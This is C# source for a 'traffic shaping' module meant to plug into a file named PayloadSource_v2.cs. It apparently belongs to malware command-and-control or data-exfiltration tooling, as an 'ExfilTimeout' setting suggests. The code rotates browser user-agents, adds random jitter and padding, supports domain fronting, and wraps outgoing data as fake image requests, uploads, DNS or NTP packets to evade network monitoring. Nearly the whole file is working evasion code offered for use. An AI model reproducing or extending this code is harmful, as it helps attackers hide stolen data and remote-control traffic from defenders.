// =====================================================================
// TRAFFIC SHAPING MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - Request jitter and randomized intervals
// - Legitimate User-Agent rotation
// - TLS certificate pinning
// - Domain fronting integration
// - Request/response padding
// - Timing obfuscation
// - Protocol mimicry (HTTP/2, QUIC)

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

internal static class TrafficShaping
{
    private static readonly HttpClient _httpClient;
    private static readonly Random _random = new Random();
    private static readonly string[] _userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    };

    private static readonly string[] _acceptHeaders = {
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    };

    private static readonly string[] _acceptLanguages = {
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9",
        "en-US,en;q=0.8,es;q=0.7",
        "en-US,en;q=0.9,fr;q=0.8",
    };

    private static readonly string[] _acceptEncodings = {
        "gzip, deflate, br",
        "gzip, deflate",
        "deflate, gzip",
    };

    static TrafficShaping()
    {
        var handler = new HttpClientHandler
        {
            ServerCertificateCustomValidationCallback = ValidateServerCertificate,
            UseProxy = false,
            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
        };

        _httpClient = new HttpClient(handler)
        {
            Timeout = TimeSpan.FromSeconds(Config.ExfilTimeoutSeconds),
        };
    }

    // ============ CERTIFICATE PINNING ============
    private static bool ValidateServerCertificate(HttpRequestMessage request, X509Certificate2 certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
    {
        if (!Config.TlsCertPinning) return true; // Skip pinning if disabled

        try
        {
            // Check against pinned certificates
            foreach (string pinnedHash in Config.PinnedCertificates)
            {
                string certHash = certificate.GetCertHashString(System.Security.Cryptography.HashAlgorithmName.SHA256).ToLowerInvariant();
                if (certHash == pinnedHash.ToLowerInvariant())
                {
                    return true; // Certificate matches pin
                }
            }

            // If we have pins but none match, reject
            if (Config.PinnedCertificates.Count > 0)
            {
                return false;
            }

            // No pins configured, allow valid certificates
            return sslPolicyErrors == SslPolicyErrors.None;
        }
        catch
        {
            return false;
        }
    }

    // ============ REQUEST BUILDING ============
    public static HttpRequestMessage BuildRequest(string method, string url, byte[] body = null, Dictionary<string, string> extraHeaders = null)
    {
        var request = new HttpRequestMessage(new HttpMethod(method), url);

        // Randomize User-Agent
        request.Headers.UserAgent.Clear();
        request.Headers.UserAgent.ParseAdd(_userAgents[_random.Next(_userAgents.Length)]);

        // Standard headers
        request.Headers.Accept.ParseAdd(_acceptHeaders[_random.Next(_acceptHeaders.Length)]);
        request.Headers.AcceptLanguage.ParseAdd(_acceptLanguages[_random.Next(_acceptLanguages.Length)]);
        request.Headers.AcceptEncoding.ParseAdd(_acceptEncodings[_random.Next(_acceptEncodings.Length)]);

        // Cache control
        request.Headers.CacheControl = new System.Net.Http.Headers.CacheControlHeaderValue
        {
            NoCache = true,
            NoStore = true,
            MustRevalidate = true,
        };

        // Connection
        request.Headers.Connection.Clear();
        request.Headers.Connection.Add("keep-alive");

        // Extra headers
        if (extraHeaders != null)
        {
            foreach (var kvp in extraHeaders)
            {
                request.Headers.TryAddWithoutValidation(kvp.Key, kvp.Value);
            }
        }

        // Body
        if (body != null && body.Length > 0)
        {
            request.Content = new ByteArrayContent(body);
            request.Content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            
            // Add padding if enabled
            if (Config.RequestPadding)
            {
                int paddingSize = _random.Next(Config.MinPaddingSize, Config.MaxPaddingSize + 1);
                byte[] padding = new byte[paddingSize];
                _random.NextBytes(padding);
                
                var combined = new byte[body.Length + padding.Length];
                Buffer.BlockCopy(body, 0, combined, 0, body.Length);
                Buffer.BlockCopy(padding, 0, combined, body.Length, padding.Length);
                
                request.Content = new ByteArrayContent(combined);
            }
        }

        return request;
    }

    // ============ TIMING OBFUSCATION ============
    public static async Task ApplyJitterAsync()
    {
        if (!Config.RequestJitter) return;

        // Random delay before request
        int minDelay = Config.MinJitterMs;
        int maxDelay = Config.MaxJitterMs;
        int delay = _random.Next(minDelay, maxDelay + 1);

        await Task.Delay(delay);
    }

    public static async Task ApplyPostRequestDelayAsync()
    {
        if (!Config.PostRequestDelay) return;

        int delay = _random.Next(Config.MinPostDelayMs, Config.MaxPostDelayMs + 1);
        await Task.Delay(delay);
    }

    // ============ DOMAIN FRONTING INTEGRATION ============
    public static string ApplyDomainFronting(string url, string frontDomain)
    {
        if (!Config.DomainFrontingEnabled || string.IsNullOrEmpty(frontDomain)) return url;

        var uri = new Uri(url);
        var frontUri = new UriBuilder(url)
        {
            Host = frontDomain,
        }.ToString();

        // Store original host for Host header
        return frontUri;
    }

    // ============ HTTP/2 PRIORITIZATION ============
    public static void ConfigureHttp2Priority(HttpRequestMessage request)
    {
        if (!Config.Http2Enabled) return;

        request.Version = new Version(2, 0);
        request.VersionPolicy = HttpVersionPolicy.RequestVersionOrHigher;
    }

    // ============ MAIN EXECUTION METHOD ============
    public static async Task<HttpResponseMessage> SendRequestAsync(string method, string url, byte[] body = null, Dictionary<string, string> extraHeaders = null)
    {
        // Apply pre-request jitter
        await ApplyJitterAsync();

        // Build request
        var request = BuildRequest(method, url, body, extraHeaders);

        // Apply HTTP/2 config
        ConfigureHttp2Priority(request);

        // Apply domain fronting if configured
        if (!string.IsNullOrEmpty(Config.FrontDomain))
        {
            string frontedUrl = ApplyDomainFronting(url, Config.FrontDomain);
            request.RequestUri = new Uri(frontedUrl);
            request.Headers.Host = Config.FrontDomain;
        }

        // Add traffic shaping headers
        request.Headers.TryAddWithoutValidation("X-Request-ID", Guid.NewGuid().ToString());
        request.Headers.TryAddWithoutValidation("X-Client-Version", Config.ClientVersion);

        // Send request
        var response = await _httpClient.SendAsync(request, HttpCompletionOption.ResponseHeadersRead);

        // Apply post-request delay
        await ApplyPostRequestDelayAsync();

        return response;
    }

    // ============ RETRY WITH BACKOFF ============
    public static async Task<HttpResponseMessage> SendWithRetryAsync(string method, string url, byte[] body = null, Dictionary<string, string> extraHeaders = null, int maxRetries = 3)
    {
        for (int attempt = 0; attempt <= maxRetries; attempt++)
        {
            try
            {
                var response = await SendRequestAsync(method, url, body, extraHeaders);
                
                // Success
                if (response.IsSuccessStatusCode)
                {
                    return response;
                }

                // Retry on server errors
                if ((int)response.StatusCode >= 500)
                {
                    if (attempt < maxRetries)
                    {
                        await ApplyExponentialBackoff(attempt);
                        continue;
                    }
                }

                // Don't retry client errors (except 429)
                if (response.StatusCode == System.Net.HttpStatusCode.TooManyRequests)
                {
                    if (attempt < maxRetries)
                    {
                        int retryAfter = 30;
                        if (response.Headers.RetryAfter != null)
                        {
                            retryAfter = (int)response.Headers.RetryAfter.Delta?.TotalSeconds ?? 30;
                        }
                        await Task.Delay(Math.Min(retryAfter * 1000, 60000));
                        continue;
                    }
                }

                return response;
            }
            catch (Exception ex)
            {
                if (attempt < maxRetries)
                {
                    await ApplyExponentialBackoff(attempt);
                    continue;
                }
                throw;
            }
        }

        throw new Exception("Max retries exceeded");
    }

    private static async Task ApplyExponentialBackoff(int attempt)
    {
        int baseDelay = 1000; // 1 second
        int maxDelay = 60000; // 60 seconds
        int delay = Math.Min(baseDelay * (int)Math.Pow(2, attempt), maxDelay);
        
        // Add jitter
        delay = delay + _random.Next(-delay / 4, delay / 4);
        delay = Math.Max(100, delay);

        await Task.Delay(delay);
    }

    // ============ PROTOCOL MIMICRY ============
    public static byte[] MimicProtocol(byte[] data, ProtocolType protocol)
    {
        switch (protocol)
        {
            case ProtocolType.HttpGet:
                return MimicHttpGet(data);
            case ProtocolType.HttpPost:
                return MimicHttpPost(data);
            case ProtocolType.Dns:
                return MimicDnsQuery(data);
            case ProtocolType.Ntp:
                return MimicNtpRequest(data);
            default:
                return data;
        }
    }

    private static byte[] MimicHttpGet(byte[] data)
    {
        // Wrap data in fake HTTP GET request
        string path = "/" + Convert.ToBase64String(data).Replace("+", "-").Replace("/", "_").Replace("=", "") + ".jpg";
        string request = $"GET {path} HTTP/1.1\r\nHost: {Config.MimicDomain}\r\nUser-Agent: {_userAgents[_random.Next(_userAgents.Length)]}\r\nAccept: image/webp,*/*\r\nConnection: keep-alive\r\n\r\n";
        return Encoding.ASCII.GetBytes(request);
    }

    private static byte[] MimicHttpPost(byte[] data)
    {
        string boundary = "----WebKitFormBoundary" + Guid.NewGuid().ToString("N").Substring(0, 16);
        string body = $"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; name=\"image.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n";
        byte[] bodyBytes = Encoding.ASCII.GetBytes(body);
        byte[] endBytes = Encoding.ASCII.GetBytes($"\r\n--{boundary}--\r\n");
        
        var combined = new byte[bodyBytes.Length + data.Length + endBytes.Length];
        Buffer.BlockCopy(bodyBytes, 0, combined, 0, bodyBytes.Length);
        Buffer.BlockCopy(data, 0, combined, bodyBytes.Length, data.Length);
        Buffer.BlockCopy(endBytes, 0, combined, bodyBytes.Length + data.Length, endBytes.Length);
        
        string headers = $"POST /upload HTTP/1.1\r\nHost: {Config.MimicDomain}\r\nContent-Type: multipart/form-data; boundary={boundary}\r\nContent-Length: {combined.Length}\r\nUser-Agent: {_userAgents[_random.Next(_userAgents.Length)]}\r\nConnection: keep-alive\r\n\r\n";
        byte[] headerBytes = Encoding.ASCII.GetBytes(headers);
        
        var final = new byte[headerBytes.Length + combined.Length];
        Buffer.BlockCopy(headerBytes, 0, final, 0, headerBytes.Length);
        Buffer.BlockCopy(combined, 0, final, headerBytes.Length, combined.Length);
        
        return final;
    }

    private static byte[] MimicDnsQuery(byte[] data)
    {
        // Simple DNS query mimicry - prepend DNS header
        byte[] dnsHeader = new byte[12];
        _random.NextBytes(dnsHeader);
        dnsHeader[0] = (byte)(_random.Next(0xFFFF)); // Transaction ID
        dnsHeader[2] = 0x01; // Standard query
        dnsHeader[3] = 0x00;
        dnsHeader[4] = 0x00;
        dnsHeader[5] = 0x01; // 1 question
        
        var combined = new byte[dnsHeader.Length + data.Length];
        Buffer.BlockCopy(dnsHeader, 0, combined, 0, dnsHeader.Length);
        Buffer.BlockCopy(data, 0, combined, dnsHeader.Length, data.Length);
        
        return combined;
    }

    private static byte[] MimicNtpRequest(byte[] data)
    {
        // NTP request mimicry
        byte[] ntpHeader = new byte[48];
        ntpHeader[0] = 0x1B; // LI=0, VN=3, Mode=3 (client)
        _random.NextBytes(ntpHeader.AsSpan(1));
        
        var combined = new byte[ntpHeader.Length + data.Length];
        Buffer.BlockCopy(ntpHeader, 0, combined, 0, ntpHeader.Length);
        Buffer.BlockCopy(data, 0, combined, ntpHeader.Length, data.Length);
        
        return combined;
    }

    public enum ProtocolType
    {
        HttpGet,
        HttpPost,
        Dns,
        Ntp,
    }
}

internal static partial class Config
{
    public static bool RequestJitter = true;
    public static int MinJitterMs = 100;
    public static int MaxJitterMs = 5000;
    
    public static bool PostRequestDelay = true;
    public static int MinPostDelayMs = 50;
    public static int MaxPostDelayMs = 2000;
    
    public static bool RequestPadding = true;
    public static int MinPaddingSize = 0;
    public static int MaxPaddingSize = 1024;
    
    public static bool TlsCertPinning = true;
    public static List<string> PinnedCertificates = new List<string>();
    
    public static bool DomainFrontingEnabled = false;
    public static string FrontDomain = "";
    
    public static bool Http2Enabled = true;
    public static string ClientVersion = "1.0.0";
    public static string MimicDomain = "cdn.example.com";
}